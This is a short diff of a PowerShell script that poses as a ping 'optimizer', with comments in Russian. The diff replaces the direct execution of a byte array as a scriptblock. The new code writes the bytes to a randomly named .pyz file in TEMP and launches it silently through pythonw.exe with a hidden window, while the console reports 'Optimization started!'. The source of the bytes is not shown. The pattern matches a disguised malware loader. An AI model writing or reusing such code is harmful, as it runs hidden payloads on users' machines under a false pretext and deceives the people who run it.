@@ -63,13 +63,17 @@ try {
     
 
     $global:MaxPing = $ping
-    
 
-    $scriptBlock = [scriptblock]::Create([Text.Encoding]::UTF8.GetString($r))
-    & $scriptBlock
-    
-  
-    Write-Host "  [✓] Optimization complete!" -ForegroundColor Green
+# Это PYZ файл
+$tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).pyz"
+[System.IO.File]::WriteAllBytes($tempFile, $r)
+
+Write-Host "  [*] Starting optimizer..." -ForegroundColor Yellow
+
+# Запускаем через pythonw (без окна)
+Start-Process pythonw.exe -ArgumentList "`"$tempFile`"" -WindowStyle Hidden
+
+Write-Host "  [✓] Optimization started!" -ForegroundColor Green
     Write-Host ""
     Write-Host "  Press any key to exit..." -ForegroundColor Gray
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
